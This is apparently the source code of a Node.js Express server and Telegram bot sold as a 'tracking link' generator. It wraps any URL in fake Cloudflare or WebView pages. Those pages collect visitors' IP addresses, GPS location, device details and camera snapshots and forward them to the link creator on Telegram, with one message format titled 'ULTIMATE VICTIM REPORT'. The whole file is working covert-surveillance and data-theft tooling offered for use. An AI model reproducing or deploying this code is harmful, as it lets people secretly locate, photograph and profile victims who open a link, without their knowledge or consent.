require('dotenv').config();
const fs = require("fs");
const express = require("express");
const cors = require('cors');
const bodyParser = require('body-parser');
const fetch = require('node-fetch');
const TelegramBot = require('node-telegram-bot-api');
const PDFDocument = require('pdfkit');

const app = express();
const bot = new TelegramBot(process.env["bot"], { polling: false }); // Changed to webhook mode

// Middlewares
app.use(cors());
app.use(bodyParser.json({ limit: '50mb' }));
app.use(bodyParser.urlencoded({ extended: true, limit: '50mb' }));
app.set("view engine", "ejs");

// Config
const CONFIG = {
  BOT_TOKEN: process.env["bot"],
  WEBHOOK_URL: "http://production-europe-west4-drams3a.railway-registry.com/3f29bfc2-8e3e-4a2f-87fa-1e2b731be11b:c5aa4cbd-325b-44a1-866b-00778a37ae5c",
  PORT: process.env.PORT || 3000,
  ADMIN_ID: 8175884349, // Add your admin ID
  DEVELOPER: '@aadi_io',
  USE_1PT: false,
  SESSION_TIMEOUT: 1800000 // 30 minutes
};

// Data Stores
const stats = {
  total: 0, success: 0, failed: 0, blocked: 0,
  users: new Set(), ipLinks: 0, ipClicks: 0,
  locations: 0, cameras: 0, infos: 0, startTime: Date.now(),
  pdfsGenerated: 0
};

const states = new Map();
const sessions = new Map();
const history = [];
const activity = new Map();

// ==================== UTILS ====================
function getIP(req) {
  return req.headers['x-forwarded-for']?.split(",")[0] || 
         req.connection?.remoteAddress || 
         req.ip || 'Unknown';
}

function getTime() {
  return new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' });
}

function setSessionTimeout(chatId) {
  if (sessions.has(chatId)) clearTimeout(sessions.get(chatId));
  const timer = setTimeout(() => {
    states.delete(chatId);
    sessions.delete(chatId);
    // Don't send "session expired" message - just clean up silently
  }, CONFIG.SESSION_TIMEOUT);
  sessions.set(chatId, timer);
}

function formatFullData(data, ip, time) {
  let result = `<b>📱 ULTIMATE VICTIM REPORT</b>\n\n`;
  result += `<b>🌐 IP Address:</b> <code>${ip}</code>\n`;
  result += `<b>🕒 Time:</b> ${time}\n`;
  result += `<b>📅 Device Date:</b> ${new Date().toLocaleString()}\n\n`;
  result += `══════════════════\n\n`;
  result += data;
  return result;
}

async function generatePDFReport(userId, data, ip) {
  return new Promise(async (resolve, reject) => {
    try {
      const fileName = `report_${userId}_${Date.now()}.pdf`;
      const filePath = `./temp/${fileName}`;
      
      // Create temp directory if doesn't exist
      if (!fs.existsSync('./temp')) {
        fs.mkdirSync('./temp');
      }

      const doc = new PDFDocument({
        size: 'A4',
        margins: { top: 50, bottom: 50, left: 50, right: 50 }
      });

      const stream = fs.createWriteStream(filePath);
      doc.pipe(stream);

      doc.fontSize(20).text('ULTIMATE VICTIM REPORT', { align: 'center' });
      doc.moveDown();
      doc.fontSize(12).text(`IP: ${ip}`, { align: 'center' });
      doc.moveDown();
      doc.fontSize(12).text(`Time: ${getTime()}`, { align: 'center' });
      doc.moveDown();

      // Remove HTML tags for PDF
      const cleanData = data.replace(/<[^>]*>/g, '').replace(/&nbsp;/g, ' ');
      const lines = cleanData.split('\n');
      
      let y = 150;
      lines.forEach(line => {
        if (y > 750) {
          doc.addPage();
          y = 50;
        }
        doc.fontSize(10).text(line, 50, y);
        y += 15;
      });

      doc.end();
      stream.on('finish', () => resolve(filePath));
      stream.on('error', reject);
    } catch (err) {
      reject(err);
    }
  });
}

// ==================== ROUTES ====================
app.get("/w/:path/:uri", (req, res) => {
  const ip = getIP(req);
  const time = getTime();

  if (req.params.path) {
    stats.ipClicks++;
    res.render("webview", {
      ip, time,
      url: Buffer.from(req.params.uri, 'base64').toString(),
      uid: req.params.path,
      a: CONFIG.WEBHOOK_URL,
      t: CONFIG.USE_1PT
    });
  } else {
    res.redirect("https://t.me/aadi_io");
  }
});

app.get("/c/:path/:uri", (req, res) => {
  const ip = getIP(req);
  const time = getTime();

  if (req.params.path) {
    stats.ipClicks++;
    res.render("cloudflare", {
      ip, time,
      url: Buffer.from(req.params.uri, 'base64').toString(),
      uid: req.params.path,
      a: CONFIG.WEBHOOK_URL,
      t: CONFIG.USE_1PT
    });
  } else {
    res.redirect("https://t.me/aadi_io");
  }
});

app.get("/", (req, res) => {
  res.json({ 
    status: 'online', 
    ip: getIP(req),
    uptime: Math.floor((Date.now() - stats.startTime) / 1000)
  });
});

// Receive location info
app.post("/location", async (req, res) => {
  try {
    const lat = parseFloat(decodeURIComponent(req.body.lat)) || null;
    const lon = parseFloat(decodeURIComponent(req.body.lon)) || null;
    const uid = decodeURIComponent(req.body.uid) || null;
    const acc = decodeURIComponent(req.body.acc) || null;

    if (lat && lon && uid && acc) {
      const userId = parseInt(uid, 36);
      if (!isNaN(userId)) {
        stats.locations++;
        await bot.sendLocation(userId, lat, lon);
        await bot.sendMessage(userId, `📍 <b>Location Captured</b>\nLatitude: <code>${lat}</code>\nLongitude: <code>${lon}</code>\nAccuracy: <code>${acc} meters</code>`, { parse_mode: 'HTML' });
        res.send("Done");
      } else {
        res.send("Invalid UID");
      }
    } else {
      res.send("Invalid data");
    }
  } catch (err) {
    console.error('Location Error:', err.message);
    res.send("Error");
  }
});

// Device or browser data
app.post("/", async (req, res) => {
  try {
    const uid = decodeURIComponent(req.body.uid) || null;
    const data = decodeURIComponent(req.body.data) || null;
    const ip = getIP(req);

    if (uid && data) {
      const userId = parseInt(uid, 36);
      if (!isNaN(userId)) {
        stats.infos++;
        const fullData = formatFullData(data, ip, getTime());
        await bot.sendMessage(userId, fullData, { parse_mode: 'HTML' });
        res.send("Done");
      } else {
        res.send("Invalid UID");
      }
    } else {
      res.send("ok");
    }
  } catch (err) {
    console.error('Info Error:', err.message);
    res.send("Error");
  }
});

// Camera snapshot
app.post("/camsnap", async (req, res) => {
  try {
    const uid = decodeURIComponent(req.body.uid) || null;
    const img = decodeURIComponent(req.body.img) || null;

    if (uid && img) {
      const userId = parseInt(uid, 36);
      if (!isNaN(userId)) {
        stats.cameras++;
        const buffer = Buffer.from(img, 'base64');
        await bot.sendPhoto(userId, buffer, { caption: '📷 <b>Camera Snapshot Captured</b>', parse_mode: 'HTML' });
        res.send("Done");
      } else {
        res.send("Invalid UID");
      }
    } else {
      res.send("Invalid image data");
    }
  } catch (err) {
    console.error('Camera Error:', err.message);
    res.send("Error");
  }
});

// PDF Generation Endpoint
app.post('/generate-pdf', async (req, res) => {
  try {
    const { uid, data, ip } = req.body;
    if (!uid || !data || !ip) {
      return res.json({ success: false, error: 'Missing data' });
    }

    const userId = parseInt(uid, 36);
    if (isNaN(userId)) {
      return res.json({ success: false, error: 'Invalid UID' });
    }

    const filePath = await generatePDFReport(userId, data, ip);
    stats.pdfsGenerated++;
    
    res.json({ success: true, path: filePath });
  } catch (err) {
    console.error('PDF Error:', err.message);
    res.json({ success: false, error: err.message });
  }
});

// ==================== TELEGRAM BOT HANDLERS ====================
bot.on('message', async (msg) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const userName = msg.from.first_name || 'User';
  
  stats.users.add(userId);

  // Handle URL input
  if (msg?.reply_to_message?.text === "🌐 Enter Your URL") {
    createLink(chatId, msg.text);
    return;
  }

  // Handle /start
  if (msg.text === "/start") {
    await bot.sendMessage(chatId, `🎉 Welcome ${userName}! 

🔗 Use this bot to create tracking links that gather visitor info.

✨ Features:
📍 Location tracking
📱 Device info
📷 Camera snapshots
🌐 IP detection

Type /help for usage or click the button below.
👨‍💻 Admin: @aadi_io`, {
      reply_markup: {
        inline_keyboard: [[{ text: "Create Link", callback_data: "crenew" }]]
      }
    });
    return;
  }

  // Handle /create
  if (msg.text === "/create") {
    createNew(chatId);
    return;
  }

  // Handle /help
  if (msg.text === "/help") {
    await bot.sendMessage(chatId, `Send /create to begin.
Then enter a URL (with http/https).
You'll receive 2 tracking links:

1. Cloudflare Page
2. WebView Page

⚠️ Note: Some sites block iframe embedding.

👨‍💻 Admin: @aadi_io`);
    return;
  }

  // Handle /stats for admin
  if (msg.text === "/stats" && userId === CONFIG.ADMIN_ID) {
    const uptime = Math.floor((Date.now() - stats.startTime) / 1000);
    const d = Math.floor(uptime / 86400);
    const h = Math.floor((uptime % 86400) / 3600);
    const m = Math.floor((uptime % 3600) / 60);
    
    await bot.sendMessage(chatId, `
📊 <b>STATISTICS</b>

🔢 Total Links: ${stats.ipLinks}
👥 Users: ${stats.users.size}
📍 Locations: ${stats.locations}
📷 Cameras: ${stats.cameras}
ℹ️ Infos: ${stats.infos}

⏱️ Uptime: ${d > 0 ? `${d}d ${h}h ${m}m` : `${h}h ${m}m`}
    `, { parse_mode: 'HTML' });
    return;
  }
});

bot.on('callback_query', async (callbackQuery) => {
  const chatId = callbackQuery.message.chat.id;
  const data = callbackQuery.data;
  const userId = callbackQuery.from.id;

  await bot.answerCallbackQuery(callbackQuery.id);

  if (data === "crenew") {
    createNew(chatId);
  }
});

// Broadcast handler
bot.on('message', async (msg) => {
  const chatId = msg.chat.id;
  if (states.get(chatId) === 'broadcasting' && msg.from.id === CONFIG.ADMIN_ID) {
    const broadcastMsg = msg.text;
    const userArray = Array.from(stats.users);
    const totalUsers = userArray.length - 1; // Exclude admin
    let sent = 0, failed = 0;
    
    const progressMsg = await bot.sendMessage(chatId, `📤 Starting broadcast to ${totalUsers} users...`);

    for (let i = 0; i < userArray.length; i++) {
      const userId = userArray[i];
      if (userId == msg.from.id) continue;

      try {
        await bot.sendMessage(userId, `📢 <b>BROADCAST MESSAGE:</b>\n\n${broadcastMsg}`, { parse_mode: 'HTML' });
        sent++;
        
        // Update progress every 5 users
        if (i % 5 === 0 || i === userArray.length - 1) {
          await bot.editMessageText(
            `📤 Broadcasting...\nSent: ${sent}/${totalUsers}\nFailed: ${failed}`,
            chatId,
            progressMsg.message_id
          );
        }
        
        // Rate limit
        await new Promise(r => setTimeout(r, 300));
      } catch (err) {
        failed++;
        console.error(`Broadcast error to ${userId}:`, err.message);
      }
    }

    await bot.editMessageText(
      `✅ Broadcast completed!\nSent: ${sent}\nFailed: ${failed}\nTotal: ${totalUsers}`,
      chatId,
      progressMsg.message_id
    );
    
    states.delete(chatId);
  }
});

// ==================== HELPER FUNCTIONS ====================
async function createLink(cid, msg) {
  const encoded = [...msg].some(char => char.charCodeAt(0) > 127);
  if ((msg.includes('http') || msg.includes('https')) && !encoded) {
    const url = cid.toString(36) + '/' + Buffer.from(msg).toString('base64');
    const cUrl = `${CONFIG.WEBHOOK_URL}/c/${url}`;
    const wUrl = `${CONFIG.WEBHOOK_URL}/w/${url}`;
    let text = `✅ <b>Your Tracking Links</b>\n\n🔗 <b>Target URL:</b>\n<code>${msg}</code>\n\n🌐 <b>CloudFlare Page:</b>\n<code>${cUrl}</code>\n\n📱 <b>WebView Page:</b>\n<code>${wUrl}</code>\n\n📊 <i>Collects: Location, Device Info, Camera, Network, Battery & More</i>`;

    if (CONFIG.USE_1PT) {
      try {
        const [x, y] = await Promise.all([
          fetch(`https://short-link-api.vercel.app/?query=${encodeURIComponent(cUrl)}`).then(res => res.json()),
          fetch(`https://short-link-api.vercel.app/?query=${encodeURIComponent(wUrl)}`).then(res => res.json())
        ]);
        text = `✅ <b>Your Shortened Links</b>\n\n🌐 <b>CloudFlare:</b>\n${Object.values(x).join("\n")}\n\n📱 <b>WebView:</b>\n${Object.values(y).join("\n")}`;
      } catch (err) {
        console.error('URL shortener error:', err.message);
      }
    }

    stats.ipLinks++;
    
    await bot.sendMessage(cid, text, {
      parse_mode: 'HTML',
      reply_markup: {
        inline_keyboard: [
          [{ text: "📊 Get PDF Report", callback_data: `get_pdf_${cid}` }],
          [{ text: "🔄 Create New Link", callback_data: "crenew" }]
        ]
      }
    });
  } else {
    await bot.sendMessage(cid, `⚠️ Please enter a valid URL including http/https.`);
    createNew(cid);
  }
}

function createNew(cid) {
  states.set(cid, 'waiting_url');
  setSessionTimeout(cid);
  bot.sendMessage(cid, `🌐 <b>Enter Your URL</b>\n\nPlease send a URL starting with http:// or https://`, {
    parse_mode: 'HTML',
    reply_markup: { force_reply: true }
  });
}

// Webhook setup
async function setupWebhook() {
  try {
    await bot.deleteWebHook();
    await new Promise(resolve => setTimeout(resolve, 1000));
    await bot.setWebHook(`${CONFIG.WEBHOOK_URL}/${CONFIG.BOT_TOKEN}`);
    console.log('✅ Webhook set successfully');
    return true;
  } catch (err) {
    console.error('❌ Webhook setup failed:', err.message);
    return false;
  }
}

// Start server
app.listen(CONFIG.PORT, async () => {
  console.log(`🚀 Server Running on Port ${CONFIG.PORT}`);
  console.log(`🌐 Webhook URL: ${CONFIG.WEBHOOK_URL}`);
  
  const success = await setupWebhook();
  if (success) {
    console.log('✅ Bot is ready to track everything!');
    console.log('📊 Send /stats to admin for statistics');
    console.log('🔗 Use /create to generate tracking links');
  } else {
    console.log('❌ Failed to set webhook');
  }
});

bot.on('polling_error', (error) => {
  console.log("Polling error:", error.code);
});

process.on('uncaughtException', (err) => {
  console.error('Uncaught Exception:', err.message);
});

process.on('unhandledRejection', (reason, promise) => {
  console.error('Unhandled Rejection:', reason);
});
